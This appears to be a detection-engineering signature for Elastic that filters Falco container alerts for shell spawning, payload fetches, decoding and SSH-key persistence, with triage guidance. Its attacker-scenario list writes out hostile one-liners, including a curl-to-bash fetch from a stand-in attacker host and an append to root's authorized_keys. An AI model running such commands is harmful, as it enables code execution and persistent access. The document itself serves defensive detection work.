---
signature_id: elastic-falco-shell-lineage
name: Falco attack-lineage rule fired in container
severity: high
data_sources:
  - process-events
created_at: 2026-04-30
updated_at: 2026-04-30
mitre:
  tactics: Execution, Persistence, Defense Evasion
  techniques: T1059, T1098.004, T1105, T1140
references:
  - https://github.com/falcosecurity/rules
related_signatures: []
base_rate:
  benign_pct: null
  sample_size: null
---

# Falco Attack-Lineage Rule (`falco.alerts`)

## Signature Logic

Detects Falco events from the curated **attack-lineage** rule family
landing in the `logs-falco.alerts-default` data stream. The
fundamental detected activity: **Falco's syscall probe observed a
process action inside a container that matches one of the upstream
sandbox+incubating attack-pattern rules** — interactive shell
spawning, ingress payload fetch, decoded-payload execution, or a
persistence-install primitive (e.g., writing `authorized_keys`).

The Elastic Agent's **Custom Logs integration** ingests
`/var/log/falco/falco.json` line-by-line, runs a `decode_json_fields`
processor that nests Falco's payload under `falco.*`, and emits one
document per Falco event into the `logs-falco.alerts-default` data
stream.

## Filter

```
event.dataset: "falco.alerts"
AND falco.rule: ("Terminal shell in container"
              OR "Launch Ingress Remote File Copy Tools in Container"
              OR "Decoding Payload in Container"
              OR "Adding ssh keys to authorized_keys"
              OR "Drop and execute new binary in container"
              OR "Read sensitive file untrusted"
              OR "Modify Shell Configuration File"
              OR "Write below root")
```

The rule list captures the cross-MITRE-family attack-lineage shapes
that share the same data stream + investigation pattern. Adding a
rule here is cheap; pruning a rule from this list because it produces
too much noise is a tuning decision (favor source-side suppression
over filter-list trimming so the signature stays a stable surface).

## Example Document

```json
{
  "event":  { "dataset": "falco.alerts" },
  "falco": {
    "rule":      "Launch Ingress Remote File Copy Tools in Container",
    "priority":  "Notice",
    "tags":      ["T1105", "container", "mitre_command_and_control"],
    "output_fields": {
      "proc": {
        "name":    "curl",
        "pname":   "bash",
        "cmdline": "curl -fsS http://web-1/ -o /tmp/fetched_0.sh"
      },
      "container": {
        "id":    "ab12cd34ef56",
        "image": { "repository": "soc-playground-canary" }
      }
    }
  },
  "host":  { "name": "vps-host" }
}
```

## Threat & Motivation

**What the activity is.** A process inside a container performed an
action that Falco's attack-rule set considers suspicious by default:
spawning an interactive shell, fetching a remote payload, decoding a
base64 blob, installing a persistent SSH key, or writing to a system
directory.

**Why an attacker would want this.** These rules sit on the standard
post-exploitation kill chain: **execution** of attacker tooling
inside a foothold container (T1059), **ingress** of secondary tooling
or scripts from a remote source (T1105), **defense-evasion** by
encoding payloads (T1140), and **persistence** by adding their own
keys to authorized_keys (T1098.004).

**Concrete attacker scenarios:**
- Web app RCE → shell in the app container → `curl http://attacker/payload | bash`
- Compromised CI build → base64-decoded post-exploit script staged in `/tmp`
- Foothold on a sandbox host → `echo ssh-rsa ... >> /root/.ssh/authorized_keys` for re-entry
- Privileged container compromise → drop and execute new binary

**Legitimate mechanisms this fires on.** All of these are real and common:
- **Cross-namespace runtime exec primitive** — host-side client
  (`docker exec`, `kubectl exec`, `crictl exec`) crosses the container
  namespace boundary. Drivers include interactive operator sessions,
  CI/CD pipeline scripted steps, scheduled probes, admin tooling.
- **Image entrypoint or init wrapper** — the image's own startup
  wrapper invokes a shell as part of container start.
- **In-namespace application shell-out** — long-running application
  shells out as part of normal work (`subprocess.run(shell=True)`,
  build hooks, image processing wrappers, log rotation).
- **Provisioning** — image build / startup scripts that legitimately
  install SSH keys (e.g., the canary-1 image bakes in known keys
  during build, not at runtime).

**Blast radius if real.** Equal to the container's effective
privileges: unprivileged sidecar < typical app container <
container with mounted Docker socket / privileged flag /
host-network / host-pid. Always check container privileges before
assigning severity.

## Risk Indicators

The risk on this signature comes from **two orthogonal axes**:

### Axis 1 — Privilege of the target

How much harm could the attacker do if this *were* an attacker?

- Container is privileged, has the Docker socket mounted, runs with
  host network or host PID
- Container hosts a critical workload (production database, payment
  service, identity provider)
- Container has secrets mounted or holds tokens with broad scope

### Axis 2 — Abnormality vs baseline

Does this look like *novel* activity or an *expected* pattern?

- This image/container has fired this rule before, in a recurring
  pattern (lower risk — likely a healthcheck, init script, or CI flow)
- This image/container has *never* fired this rule before (higher risk)
- The proc lineage doesn't match any pattern we've seen for this image
- Co-firing of multiple rules from the attack-lineage family in the
  same `container.id` in a tight window (higher risk — multi-stage
  attack shape)

A high-privilege target + novel/abnormal pattern is the high-risk
quadrant. A low-privilege target + recurring expected pattern is the
low-risk quadrant.

## Detection Gaps

- Falco only sees containers it is configured to watch. Containers
  outside Falco's scope are invisible.
- A non-shell process executing arbitrary commands without matching
  one of the listed rules is invisible to *this* signature even if
  it's adversarial — adding the right rule covers the gap.
- Falco's `user_known_*` macros suppress matches; anything those
  exception lists cover never fires.
- The container plugin in 0.43.x reports `container.id` reliably but
  may report `container.name` as `<NA>` for already-running
  containers — per-host attribution sometimes requires an out-of-band
  ID→hostname mapping.
